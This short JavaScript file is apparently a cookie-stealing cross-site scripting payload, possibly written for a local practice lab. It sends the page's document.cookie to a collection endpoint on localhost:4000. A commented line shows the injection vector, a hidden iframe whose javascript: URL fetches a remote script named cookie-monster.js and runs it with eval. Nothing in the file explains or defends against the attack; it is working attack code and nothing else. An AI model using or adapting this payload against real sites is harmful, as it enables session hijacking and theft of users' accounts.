fetch("http://localhost:4000/eat-cookie", {
  method: "POST",
  cache: "no-cache",
  headers: { "Content-Type": "application/json" },
  referrerPolicy: "no-referrer",
  body: JSON.stringify({
    cookie: document.cookie,
  }),
});

// <iframe style="display: none" src="javascript:fetch(`http://localhost:4000/public/cookie-monster.js`).then((response) => { return response.text() }).then((data) => { eval(data) });">
